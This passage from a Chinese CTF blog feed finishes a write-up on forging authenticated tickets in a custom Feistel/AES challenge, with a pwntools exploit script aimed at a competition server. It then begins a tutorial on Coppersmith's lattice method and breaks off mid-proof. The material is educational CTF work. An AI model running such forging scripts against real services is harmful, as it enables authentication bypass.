class="built_in">self</span>.n_size))</span><br></pre></td></tr></table></figure><p>（multer和L有关，不可知，那就不管了）异或，最后AES加密，返回密文。</p><p>由于AES的key也不可知，所以我们想要拿到Auth，没别的方法了。只能在传明文获取Auth时，让我们的msg的第二块和第四块和第五块和真正的能拿到FLAG的msg的明文保持一致了。</p><p>这里一个做法就是，本地跑这个程序，把那些麻烦的PoW啥的去去掉，一些限制（比如用户名不能是Administrator）也去去掉，然后打印一些方便我们审计的信息，（当然，熟用那种自带debug编译器的大佬可以忽略，IDLE选手还是比较喜欢print debug大法）</p><p>那就是怎么伪造密文了。</p><p>先看看密文的生成</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">C1</span>, <span class="built_in">C2</span> = <span class="keyword">self.feistel_enc_2r(M_list[2*i], </span>M_list[<span class="number">2</span>*i +<span class="number">1</span>])</span><br><span class="line"><span class="symbol">def</span> feistel_enc_2r(<span class="keyword">self, </span>M1, M2):</span><br><span class="line">        <span class="built_in">C1</span> = <span class="keyword">strxor(self.cipher.encrypt(strxor(M1, </span><span class="keyword">self.L)), </span>M2)</span><br><span class="line">        <span class="built_in">C2</span> = <span class="keyword">strxor(self.cipher.encrypt(strxor(C1, </span><span class="keyword">strxor(self.L, </span><span class="keyword">self.delta))), </span>M1)</span><br><span class="line">        return <span class="built_in">C1</span>, <span class="built_in">C2</span></span><br></pre></td></tr></table></figure><p>我们把明文和密文看成16字节一块，两块一组，两块明文对自己这组生成的密文有影响，但每组明文间的加密是独立的。也就是第一组（第一二块）明文不影响第二组（第三四块）明文生成的第二块密文。</p><p>那么，如果我们的uid是1，用户名是Administrator，cmd是Give_Me_Flag，不加信息，</p><p>（本地起这个程序，把用户名和cmd的限制给取消掉，然后打印一下M_list）</p><p><img src="https://i.loli.net/2020/12/17/eR1q9kg6OMVJhfZ.png" alt="image-20201102204318891"></p><p>我们会生成4块明文，<code>[b&#39;Uid=1\xffUserName=A&#39;, b&#39;dministrator\xffT=e&#39;, b&#39;7d3e769\xffCmd=Give&#39;, b&#39;_Me_Flag\xff&#39;]</code></p><p>前面说了，为了让生成的Auth便于计算，我们要加入附加信息（Appendix）来控制明文组数。</p><p>但这里先看看M_list叭，如果我们想要得到Auth，那么我们就得保证我们构造的用户名和cmd在不等于限定值的情况下，M_list的第二组和第四组与用户名为Administrator和cmd为Give_Me_Flag时的M_list的相应分组相同。</p><p>这样子看过去，对于我们目前得到的这个M_list是很好构造的，由于Administrator的A在第一组，那么我们注册Bdministrator；由于Give_Me_Flag的Give在第三组，那么我们注册give_Me_Flag就好了。然后加一加Appendix控制下组数。但是注意到第二组最后一位是sha256的首位，而我们要是动了用户名，这个值大概率也有变，所以我们还得控制这个用户名的首位，可能不能是B，我们就在ascii 为0到128之间找一个字符*，让*dministrator的sha256的首位为e就可以了。经过测试，字符‘P’就是一个合适的值</p><p><img src="https://i.loli.net/2020/12/17/tcLqimUel4NXygV.png" alt="image-20201102234733848"></p><p>看，上面是目标Auth，下面是我们伪造的用户名和cmd获取的Auth，他们是一致的。所以Auth这一关过了。那就只剩下密文的伪造了。</p><p>对于第一组，是由uid和用户名决定的。其中uid不用伪造，问题不大，但是用户名的密文咋办，我们用户名不能等于Administrator，但是又要搞到的Administrator的密文。</p><p>这里用到的第一技巧就是，增加uid的长度，反正uid最后模16了，我们控制uid长度为5，用户名为Administratorr（多了一个r），这样子对照一下，</p><p><img src="https://i.loli.net/2020/12/17/mdSovXRN5ZuQqgF.png" alt="image-20201102235135632"></p><p>可以发现，多出来的那个r正好被挤到第三组去了，这样子我们的用户名既没有等于Administrator，但是又获得了前两块属于Administrator的msg的密文。</p><p>ok。一半的工作完成。</p><p>第二组，由于uid那么构造了，那么第二组明文就是这样子的，<code>b&#39;r\xffT=ab86207b\xffCmd&#39;, b&#39;=Give_Me_Flag\xff</code>由hash和cmd和组成（这里只是测试，附加信息就先不加了）。</p><p>这里我们要的是cmd=Give_Me_Flag的密文，怎么伪造cmd呢？我们不能改变任何一个字符，不然由于AES的存在，密文整个就不一样了。但是输入的cmd又不能等于Give_Me_Flag。这里我们还是用前面的方法，由于这里分组加密的特性，我们把cmd顶到第二块的末尾，大概就是让第二组的第二块明文是这样子，</p><p><code>&#39;Cmd=Give_Me_Flag&#39;</code></p><p>刚好16个字节，然后我们的命令就可以改成Give_Me_Flagg，多的g到第五块去了，咱们就不用管了。至于怎么顶，这里就要利用uid了，在uid长度仍然保持为5的情况下，进行加减，控制hash的长度为12就好了，11111%16 = 7，那就用11116，</p><p><img src="https://i.loli.net/2020/12/18/rUZ1TbpSFjdhQKk.png" alt="image-20201218133935540"></p><p>可以看到这样<code>\xffT=4110a98d23fc\xff</code>刚好占满了第二组第一块的16字节，<code>&#39;Cmd=Give_Me_Flag</code>占了另一块。而我们输入的cmd命令是Give_Me_Flagg，是能过验证的。这样交互，让他加密，就能得到明文：<code>b&#39;\xffT=4110a98d23fc\xff&#39;, b&#39;Cmd=Give_Me_Flag&#39;</code>生成的密文了。但是这里还有个问题，hash由用户名控制，用户名为Administrator的12位hash是e7d3e769f3f5，然而我们又不能注册用户为Administrator，那一个想法就是，碰撞，找一个由可见字符串组成的13位字符串（Administrator的长度），sha256后前12位为e7d3e769f3f5就可以了。然而这显然不现实，12位是96bit，有这算力，比特币不是随便挖？所以这题有解的一个原因就是，这个系统并没有验证用户名的hash，所以你随便整个用户名就好(我们这里就用的Administratos)。</p><p>但是新问题产生了，Auth的获取怎么办？现在我们的uid=11116，我们来看看用户名为Administrator，cmd为Give_Me_Flag的情况</p><p><img src="https://i.loli.net/2020/12/17/mUTV2yFdIfXDirY.png" alt="image-20201103001239680"></p><p>想要得到Auth，就得构造同样的第二块、第四块明文，第二块明文还好说，用户名我们多打一个字符就能绕过检查了，而这个字符也会被顶到第三块，对Auth没有影响，并且我们也可以uid相应的减1，让第四块密文不受到影响。但是第四块的明文本身就不好操作啊，这里要是也多打一个字符绕过的话，第五组就多了一个字符，这样产生的Auth就完全对不上了。</p><p>所以要把证获取到正确的Auth，我们需要第二块，第四块，第五块分别为：<code>b&#39;me=Administrator&#39;, b&#39;Cmd=Give_Me_Flag&#39;, b&#39;\xff&#39;</code></p><p>这里我的做法是，缩短uid为两位长，构造用户名为：me=Administrator，控制uid%16为8，构造cmd为Cmd=Give_Me_Flag</p><p><img src="https://i.loli.net/2020/12/17/AZqsFpIwMEDCQlT.png" alt="image-20201103002724699"></p><p>可以看到是完全一致的。如果此时打印出来了C_list的话，也会发现，此时这两组产生的C_list的最后一组也是一致的，因为我们这里M_list的到数两组是一致的。</p><h4 id="解题流程-2"><a href="#解题流程-2" class="headerlink" title="解题流程"></a>解题流程</h4><p>所以这道题的整个解题流程：（交互可以直接手撸）</p><ol><li>uid：24，name：me=Administrator，cmd：Cmd=Give_Me_Flag        获取Auth和第三段密文</li><li>uid：11116，name：me=Administratorr，后面随意                               获取第一段密文</li><li>uid：11116，name：Administratos，cmd：Give_Me_Flagg                  获取第二段密文</li><li>发送Auth和三段密文的拼接，获取flag</li></ol><p>exp</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"><span class="keyword">sh</span>=remote(<span class="string">"123.57.4.93"</span>,<span class="string">"45216"</span>)</span><br><span class="line">from pwnlib.util.iters import mbruteforce</span><br><span class="line">from hashlib import <span class="built_in">sha256</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">def proof_of_work(<span class="keyword">sh</span>):</span><br><span class="line">    <span class="keyword">sh</span>.recvuntil(<span class="string">"XXXX+b\'"</span>)</span><br><span class="line">    suffix = <span class="keyword">sh</span>.recvuntil(<span class="string">"\'"</span>).decode(<span class="string">"utf8"</span>)[:-<span class="number">1</span>]</span><br><span class="line">    <span class="built_in">log</span>.success(suffix)</span><br><span class="line">    <span class="keyword">sh</span>.recvuntil(<span class="string">"== b\'"</span>)</span><br><span class="line">    cipher = <span class="keyword">sh</span>.recvuntil(<span class="string">"\'"</span>).decode(<span class="string">"utf8"</span>)[:-<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">print</span>(suffix)</span><br><span class="line">    <span class="keyword">print</span>(cipher)</span><br><span class="line">    proof = mbruteforce(lambda <span class="keyword">x</span>: <span class="built_in">sha256</span>((<span class="keyword">x</span> + suffix).encode()).hexdigest() ==  cipher, <span class="built_in">string</span>.ascii_letters + <span class="built_in">string</span>.digits, length=<span class="number">4</span>, method=<span class="string">'fixed'</span>)</span><br><span class="line">    <span class="keyword">sh</span>.sendlineafter(<span class="string">"Give me XXXX:"</span>, proof)</span><br><span class="line">proof_of_work(<span class="keyword">sh</span>)</span><br><span class="line"><span class="keyword">sh</span>.recvuntil(<span class="string">"option:"</span>)</span><br><span class="line"><span class="keyword">sh</span>.sendline(<span class="string">'1'</span>)</span><br><span class="line"><span class="keyword">sh</span>.recvuntil(<span class="string">"id:"</span>)</span><br><span class="line"><span class="keyword">sh</span>.sendline(<span class="string">'24'</span>)</span><br><span class="line"><span class="keyword">sh</span>.recvuntil(<span class="string">"name:"</span>)</span><br><span class="line"><span class="keyword">sh</span>.sendline(<span class="string">"me=Administrator"</span>)</span><br><span class="line"><span class="keyword">sh</span>.recvuntil(<span class="string">"and:"</span>)</span><br><span class="line"><span class="keyword">sh</span>.sendline(<span class="string">"Cmd=Give_Me_Flag"</span>)</span><br><span class="line"><span class="keyword">sh</span>.recvuntil(<span class="string">"?"</span>)</span><br><span class="line"><span class="keyword">sh</span>.sendline(<span class="string">""</span>)</span><br><span class="line"><span class="keyword">sh</span>.recvuntil(<span class="string">"ket:"</span>)</span><br><span class="line">ticket=<span class="keyword">sh</span>.recvuntil(<span class="string">"\n"</span>)[:-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">sh</span>.recvuntil(<span class="string">"Auth:"</span>)</span><br><span class="line">Auth=<span class="keyword">sh</span>.recvuntil(<span class="string">"\n"</span>)[:-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">sh</span>.recvuntil(<span class="string">"option:"</span>)</span><br><span class="line"><span class="keyword">sh</span>.sendline(<span class="string">"1"</span>)</span><br><span class="line"><span class="keyword">sh</span>.recvuntil(<span class="string">"id:"</span>)</span><br><span class="line"><span class="keyword">sh</span>.sendline(<span class="string">"65548"</span>)</span><br><span class="line"><span class="keyword">sh</span>.recvuntil(<span class="string">"name:"</span>)</span><br><span class="line"><span class="keyword">sh</span>.sendline(<span class="string">"Administratorr"</span>)</span><br><span class="line"><span class="keyword">sh</span>.recvuntil(<span class="string">"and:"</span>)</span><br><span class="line"><span class="keyword">sh</span>.sendline(<span class="string">"Give_Me_Flagg"</span>)</span><br><span class="line"><span class="keyword">sh</span>.recvuntil(<span class="string">"?"</span>)</span><br><span class="line"><span class="keyword">sh</span>.sendline(<span class="string">""</span>)</span><br><span class="line"><span class="keyword">sh</span>.recvuntil(<span class="string">"ket:"</span>)</span><br><span class="line">ticket1=<span class="keyword">sh</span>.recvuntil(<span class="string">"\n"</span>)[:-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">sh</span>.recvuntil(<span class="string">"option:"</span>)</span><br><span class="line"><span class="keyword">sh</span>.sendline(<span class="string">'1'</span>)</span><br><span class="line"><span class="keyword">sh</span>.recvuntil(<span class="string">"id:"</span>)</span><br><span class="line"><span class="keyword">sh</span>.sendline(<span class="string">'65548'</span>)</span><br><span class="line"><span class="keyword">sh</span>.recvuntil(<span class="string">"name:"</span>)</span><br><span class="line"><span class="keyword">sh</span>.sendline(<span class="string">"Administratos"</span>)</span><br><span class="line"><span class="keyword">sh</span>.recvuntil(<span class="string">"and:"</span>)</span><br><span class="line"><span class="keyword">sh</span>.sendline(<span class="string">"Give_Me_Flagg"</span>)</span><br><span class="line"><span class="keyword">sh</span>.recvuntil(<span class="string">"?"</span>)</span><br><span class="line"><span class="keyword">sh</span>.sendline(<span class="string">""</span>)</span><br><span class="line"><span class="keyword">sh</span>.recvuntil(<span class="string">"ket:"</span>)</span><br><span class="line">ticket2=<span class="keyword">sh</span>.recvuntil(<span class="string">"\n"</span>)[:-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">sh</span>.recvuntil(<span class="string">"option:"</span>)</span><br><span class="line"><span class="keyword">sh</span>.sendline(<span class="string">'2'</span>)</span><br><span class="line"><span class="keyword">sh</span>.recvuntil(<span class="string">"Ticket:"</span>)</span><br><span class="line"><span class="keyword">sh</span>.sendline(ticket1[:<span class="number">64</span>]+ticket2[<span class="number">64</span>:<span class="number">64</span>*<span class="number">2</span>]+ticket[-<span class="number">2</span>:])</span><br><span class="line"></span><br><span class="line"><span class="keyword">sh</span>.recvuntil(<span class="string">"Auth:"</span>)</span><br><span class="line"><span class="keyword">sh</span>.sendline(Auth)</span><br><span class="line"></span><br><span class="line"><span class="keyword">sh</span>.interactive()</span><br></pre></td></tr></table></figure><p>不得不说这一题出的很精妙，精妙到连输入字符的长度都卡的很死又恰到好处，uid的功能也很灵活，最后的突破点在一个hash未验证。解题花了快一个晚上，除了啃了好久的代码，主要是各种试错。想了很多种构造的方法，包括字节翻转绕过之类的，最后都被一一否决。</p><p>但最后构造出来了并拿到flag还是很开心的，虽然再一次认识到了自己和大佬们间的差距。（队伍最后只解出来了两道密码学和一道逆向，差了2名与决赛资格失之交臂，还是挺可惜的）</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这两场比赛的四道题目的质量算是比较高叭，byte是两道公钥密码，一个是CRT和脸，一个sm2，。x-nuca是一个奇异爱德华曲线，和一个不知道是不是自创的分组密码。（要是验证hash的话这样的算法系统应该没别的漏洞了，叭？）然后x-nuca还有一道我没解出来的是LWE，格密码的东西，还是比较生疏。</p><p>总的来说这两场比赛，从中确实还是学到了许多东西。也稍微锻炼了下心性（那么长的代码一开始真的让人望而却步，但是一点点啃下来，发现也还好啦。并没有想象中的那么复杂（因为复杂的地方我直接不看，哈哈哈哈））。</p><p>Stay hungry, stay foolish.</p>]]></content>
      
      
      <categories>
          
          <category> 比赛小屋 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Write Up </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>密码学学习笔记 之 Coppersmith’s Method</title>
      <link href="/2020/08/13/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8Bcoppersmith/"/>
      <url>/2020/08/13/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8Bcoppersmith/</url>
      
        <content type="html"><![CDATA[<p>首发于<a href="https://www.anquanke.com/post/id/211028" target="_blank" rel="noopener">安全客</a></p><p>这一块咕咕咕了好久，暑假了，终于才有时间去细究coppersmith背后的原理。</p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>&emsp;&emsp;还记得自己刚入门CTF后打的第一个相对比较大的比赛就是2019届的强网杯，那个时候密码学就有一道copper study的题目。对于刚入门时来说，觉得那道题简直就是（无法形容）。后来才知道原来里面的每一关都可以在github上找到相应的脚本。但是当我想去找原理的时候，却发现，，，找不到。所以也才有了这篇文章。</p><h3 id="Coppersmith’s-Method"><a href="#Coppersmith’s-Method" class="headerlink" title="Coppersmith’s Method"></a>Coppersmith’s Method</h3><p>&emsp;&emsp;首先看看Coppersmith’s Method这玩意儿能干啥。简而言之，就是有一个函数，比如$F(x) = x^3+x+123$，然后有一个模数，比如 $M = 77$，然后假设存在一个$x_0$ 满足$F(x_0) \equiv 0 \pmod{M}$, 并且如果这个$x_0$小于某个特定的值，那么就可以用Coppersmith’s Method去找到这个$x_0$。【PS：想要实现这个手法还是需要掌握一点格基规约的相关知识的（至少知道格基规约是干啥的，结果输出的是啥）】</p><p>&emsp;&emsp;总的来说，如果能将M分解，那么找到这个$x_0$是容易的，用一个中国剩余定理即可；否则就是困难的。对应的，如果我们能够找到一个解满足$x^2 \equiv 1 \pmod{M}$ 并且这个x不等于$\pm 1 \pmod{M}$，那么我们用一个GCD就能将这个M给分解。具体可参考<a href="https://paper.seebug.org/727/" target="_blank" rel="noopener">二十年以来对 RSA 密码系统攻击综述</a>一文。因此，我们并不希冀于有一个有效的算法对于所有这样的同余式都能找到解，否则也就意味着大数分解问题破解了。</p><p>&emsp;&emsp;既然不能对所有的同余式都能找到解，那能找到解的条件是啥呢？对于度为$d$的多项式$F(x)$，如果$x_0$满足$F(x_0) \equiv 0 \pmod{M}$ 并且$|x_0|&lt; M^{\frac{1}{d}-\epsilon}$，那么这个解$x_0$就能在多项式时间内被找到。</p><h4 id="First-Steps-to-Coppersmith’s-Method"><a href="#First-Steps-to-Coppersmith’s-Method" class="headerlink" title="First Steps to Coppersmith’s Method"></a>First Steps to Coppersmith’s Method</h4><p>&emsp;&emsp;首先我们有在模M下的度为d的并且系数为整数的一个首一多项式：$F(x)=x^d+a_{d-1}x^{d-1}+\dots+a_1x+a_0$【如果多项式不是首一的，我们整体的系数乘上一个$a_d^{-1}$即可，如果$a_d$在模M没有逆元，那这条同余式可以拆成同余式组，但这并不是这篇文章讨论的重点】假设我们知道存在一个整数$x_0$满足$F(x_0) \equiv 0 \pmod{M}$ 并且 $|x_0|&lt;M^{\frac{1}{d}}$，我们的任务就是找到这样的$x_0$。我们想，如果有这样一条多项式$G(x)$，他的解也是$x_0$。但是他的系数很小，导致$x_0$可以满足$G(x_0)= 0$【注意这里是等号，不是同于号】Coppersmith’s Method就是想办法去将这个$F(x)$变形为成为这样的$G(x)$。</p><h5 id="example-1"><a href="#example-1" class="headerlink" title="example 1"></a>example 1</h5><p>&emsp;&emsp;假设$M=17 * 19=323$，$F(x)=x^2+33x+215$,我们想找到一个小根$x_0$满足$F(x_0)\equiv 0 \pmod{M}$【这里的$x_0=3$，但是在整数域下，$F(3)!=0$ 】</p><p>&emsp;&emsp;我们可以找到一个多项式$G(x) = 9\cdot F(x) -M\cdot(x+6)=9x^2-26x-3$ 满足$G(3)=0$，这个解可以直接用求根公式得到，如果次数比较大，也可以用牛顿迭代法。</p><p>&emsp;&emsp;好了，这就是一元Coppersmith’s Method核心思路了，其实一点也不难的吼。</p><p>&emsp;&emsp;接下来主要是对这个$x_0$的界的一些讨论以及如何尽量的提高这个界的一些手法。</p><p>&emsp;&emsp;我们定义$X$为这个$|x_0|$取值的上界，</p><p>&emsp;&emsp;然后我们将$F(x)$表示为一个行向量$b_F=(a_0,a_1X,a_2X^2,…,a_dX^d)$</p><h5 id="Theorem-1-Howgrave-Graham"><a href="#Theorem-1-Howgrave-Graham" class="headerlink" title="Theorem 1(Howgrave-Graham)"></a>Theorem 1(Howgrave-Graham)</h5><p>&emsp;&emsp;首先我们有$F(x),X,M,b_F$这几个上面提到的值</p><p>&emsp;&emsp;也有$F(x_0)\equiv 0 \pmod{M}$</p><p>&emsp;&emsp;那么，当$||b_F||&lt;\frac{M}{\sqrt{d+1}}$，则有$F(x_0) = 0$</p><h6 id="proof"><a href="#proof" class="headerlink" title="proof"></a>proof</h6><p>&emsp;&emsp;首先我们需要知道著名的柯西不等式 $(\sum_\limits{i=1}^{n}x_iy_i)^2≤(\sum_\limits{i=1}^{n}x_i^2)(\sum_\limits{i=1}^{n}y_i^2)$,</p><p>&emsp;&emsp;设$y_i=1，x_i≥0，1≤i≤n$，那么我们有$\sum_\limits{i=1}^{n}x_i≤\sqrt{n\sum_\limits{i=1}^{n}x_i^2}=\sqrt{n}||(x_1,…,x_i)||$</p><p>&emsp;&emsp;因而$|F(x_0)|=|\sum_\limits{i=1}^{d}a_ix_0^i|≤\sum_\limits{i=1}^{d}|a_i||x_0|^i≤\sum_\limits{i=1}^{d}|a_i|X^i≤\sqrt{d+1}||b_F||&lt;\frac{\sqrt{d+1}M}{\sqrt{d+1}}=M$</p><p>&emsp;&emsp;所以$-M&lt;F(x_0)&lt;M$，又因为$F(x_0)\equiv 0 \pmod{M}$,所以$F(x_0)= 0 $</p><p>&emsp;&emsp;【这里不等式的第三个就用到了柯西不等式的性质】</p><p>&emsp;&emsp;这个定理对于确定$x_0$的边界值$X$很重要。</p><p>&emsp;&emsp;之前我们找到的G(x)我们直接给出的，现在开始说这个$G(x)$该怎么去找，首先我们考虑度为$d-1$的多项式$G_i(x) = Mx^i(0≤i&lt;d) $，还有一个$F(x)$，显然，这里一共d+1条式子，他们的均有解$x = x_0 \pmod{M}$，我们将他们的系数向量组合成一个矩阵$B = \begin{bmatrix} M&amp;0&amp;\dots&amp;0&amp;0 \newline 0&amp;MX&amp;\dots&amp;0&amp;0 \newline \vdots&amp;\vdots&amp;\ddots&amp;\vdots \newline 0&amp;0&amp;\dots&amp;MX^{d-1}&amp;0 \newline a_0 &amp;a_1X&amp;\dots &amp;a_{d-1}X^{d-1}&amp;X^d\end{bmatrix}$，$X$为$x_0$的取值上界</p><p>&emsp;&emsp;显然，这个矩阵的行列式为：$det(L)=M^dX^{d(d+1)/2}$</p><p>&emsp;&emsp;然后我们利用LLL算法做一个格基规约，然后设规约后的矩阵的第一行行向量为$b’$，这一点需要用到LLL的一个性质就是，</p><p>&emsp;&emsp;$||b’||≤2^{\frac{n-1}{4}}det(L)^{\frac{1}{n}}$，所以$||b’||≤ 2^{\frac{d}{4}}M^{\frac{d}{d+1}}X^{\frac{d}{2}}$</p><p>&emsp;&emsp;为了满足Theorem 1，故要求$2^{\frac{d}{4}}M^{\frac{d}{d+1}}X^{\frac{d}{2}}&lt;\frac{M}{\sqrt{d+1}}$，移项一下可得$2^{\frac{d}{4}}\sqrt{d+1}X^{\frac{d}{2}}&lt;M^{\frac{1}{d+1}}$</p><p>&emsp;&emsp;如果d=2，那么$X≈M^{\frac{1}{3}}$,如果d=3，那么$X≈M^{\frac{1}{6}}$。</p><p>&emsp;&emsp;至此，我们初步的有了一个$X$的取值范围，但这还并未达到$M^{\frac{1}{d}-\epsilon}$的程度。。。</p><h5 id="example-2"><a href="#example-2" class="headerlink" title="example 2"></a>example 2</h5><p>&emsp;&emsp;设M=10001，多项式$F(x)=x^3+10x^2+5000x-222$，【这里其实我们已经提前知道$x_0 = 4$，所以满足$x_0 &lt; M^{\frac{1}{6}}$】</p><p>&emsp;&emsp;这里我们设$x_0$的上界$X=10$，所以我们构造格$B = \begin{bmatrix} M&amp;0&amp;0&amp;0 \newline 0&amp;MX&amp;0&amp;0 \newline  0&amp;0&amp;MX^{2}&amp;0 \newline -222 &amp;5000X&amp;10X^2&amp;X^3\end{bmatrix}$，利用LLL规约后我们可以得到第一行(the first row)为$(444,10,-2000,-2000)$，所以我们找到多项式$G(x)=444+x-20x^2-2x^3$，来个牛顿迭代法求根可得$x_0=4$</p><h4 id="The-Full-Coppersmith-Method"><a href="#The-Full-Coppersmith-Method" class="headerlink" title="The Full Coppersmith Method"></a>The Full Coppersmith Method</h4><p>&emsp;&emsp;这里回顾一下example 2，即使以$M^{\frac{1}{6}}$来计算边界也应该是4.3左右，那为什么我们设X=10最终也可以得到正确的结果呢？其实审视一下整个过程，我们最终的目的只是为了获得一组系数，最后规约出来的行向量也都做了相应的”去除X“处理，所以这里对X的取值其实并不用特别严格。</p><p>&emsp;&emsp;其次，如果不取这个约来的边界$M^{\frac{1}{6}}$,而是直接将d=3带入$2^{\frac{d}{4}}\sqrt{d+1}X^{\frac{d}{2}}&lt;M^{\frac{1}{d+1}}$来计算这个x的边界，其实边界值应该是2.07左右。嗯？还是那个问题，那为啥我们可以得到正确结果呢？因为其实这个边界值也并不是很严格，在推导得出这个值的时候本身就用了很多次不等式，再者，我们利用的LLL中的那个性质，$||b’||≤2^{\frac{n-1}{4}}det(L)^{\frac{1}{n}}$，我们取的是LLL算法规约出来的最坏的情况，而大多数情况得到的结果要比这值小许多。</p><p>&emsp;&emsp;回到这一章的主题，在上一章中我们对X的取值有不等式：$2^{\frac{d}{4}}M^{\frac{d}{d+1}}X^{\frac{d}{2}}&lt;\frac{M}{\sqrt{d+1}}$，稍微还原一下是$2^{\frac{n-1}{4}}M^{\frac{d}{n}}X^{\frac{d(d+1)}{2n}}&lt;\frac{M}{\sqrt{n}}$，所以想要增加X就有两个思路，一个是往矩阵里多加几行向量来增加格的维度$n$，第二个就是增大$M$了。【这两个方法在公式层面看起来可能不那么直观，公式还需要再变形一下，并且应该也会有一个最优解】</p><p>&emsp;&emsp;针对第一种方案，我们称这种往格里插入的，增加了格的维度而不增加M的多项式为：“x-shift” polynomial，它们是$xF(x),x^2F(x),…,x^kF(x)$，显然这些多项式在M下的解也为$x_0$。</p><p>&emsp;&emsp;针对第二种方案，我们可以利用$F(x)$的幂来增加M，因为$F(x_0) \equiv 0 \pmod{M}$，则有$F(x_0)^k \equiv 0 \pmod{M^k}$</p><p>&emsp;&emsp;我们继续拿上文中的example 2来举例，之前我们用到的格的维度n=4，所以d=3，带入那条不等式我们可以得到$2^{\frac{3}{4}}(M^3X^6)^{\frac{1}{4}}&lt;\frac{M}{\sqrt{4}}$，带入$M、X$可得$X≈2.07$，现在我们往格中添加两个多项式$xF(x),x^2F(x)$，得到</p><p>$B = \begin{bmatrix} M&amp;0&amp;0&amp;0&amp;0&amp;0 \newline 0&amp;MX&amp;0&amp;0&amp;0&amp;0 \newline  0&amp;0&amp;MX^{2}&amp;0&amp;0&amp;0 \newline -222 &amp;5000X&amp;10X^2&amp;X^3&amp;0&amp;0 \newline 0&amp;-222X&amp;5000X^2&amp;10X^3&amp;X^4&amp;0 \newline  0&amp;0&amp;-222X^{2}&amp;5000X^3&amp;10X^4&amp;X^5 \end{bmatrix}$</p><p>&emsp;&emsp;现在我们格的维度为6，并且行列式为$M^3X^{15}$，带入那条不等式可得$2^{\frac{5}{4}}(M^3X^{15})^{\frac{1}{6}}&lt;\frac{M}{\sqrt{6}}$，现在算出来$X≈3.11$，可以看到通过添加“x-shift” polynomial，我们确实增大了X。</p><p>&emsp;&emsp;这里有一个现成的结论就是通过添加“x-shift” polynomial：$ xF(x),x^2F(x),…,x^{d-1}F(x)$，我们可以使得$X≈M^{\frac{1}{2d-1}}$，所以当d=3，通过“x-shift” polynomial，我们将$X≈M^{\frac{1}{6}}$ 提升为$X≈M^{\frac{1}{5}}$。那么如果在此基础上再增加了M呢？</p><h5 id="Theorem-2-（Coppersmith）"><a href="#Theorem-2-（Coppersmith）" class="headerlink" title="Theorem 2 （Coppersmith）"></a>Theorem 2 （Coppersmith）</h5><p>&emsp;&emsp;设$0&lt;\epsilon &lt;min{0.18,\frac{1}{d}} $,$F(x)$为度为d的首一多项式，如果其在域$M$下有一个或多个根$x_0$满足$|x_0|&lt;M^{\frac{1}{d}-\epsilon}$，那么我们就可以在与$d,\frac{1}{\epsilon},log(M)$相关的多项式时间内找到它，</p><h6 id="proof-1"><a href="#proof-1" class="headerlink" title="proof"></a>proof</h6><p>&emsp;&emsp;设$h&gt;1$，构造一个格$L$，用过多项式：$G _ {i,j}(x)=M^{h-1-j}F(x)^jx^i,(0≤i&lt;d,0≤j&lt;h)$,注意到$G _ {i,j}(x_0)\equiv 0 \pmod{M^{h-1}}$，那么格L的维度就是$dh$，其行列式$det(L)=M^{\frac{(h-1)hd}{2}}X^{\frac{(dh-1)dh}{2}}$</p><p>&emsp;&emsp;【这里可能看着比较抽象，没事，待会下面会有个例子】</p><p>&emsp;&emsp;此时我们运用LLL算法进行规约，我们得到第一行的行向量$b’$，其满足$||b’||&lt;2^{\frac{dh-1}{4}}det(L)^{\frac{1}{dh}}=2^{\frac{dh-1}{4}}M^{\frac{h-1}{2}}X^{\frac{dh-1}{2}}$</p><p>&emsp;&emsp;由于这里的域M已经提升为$M^{h-1}$，这里我们再用上Theorem 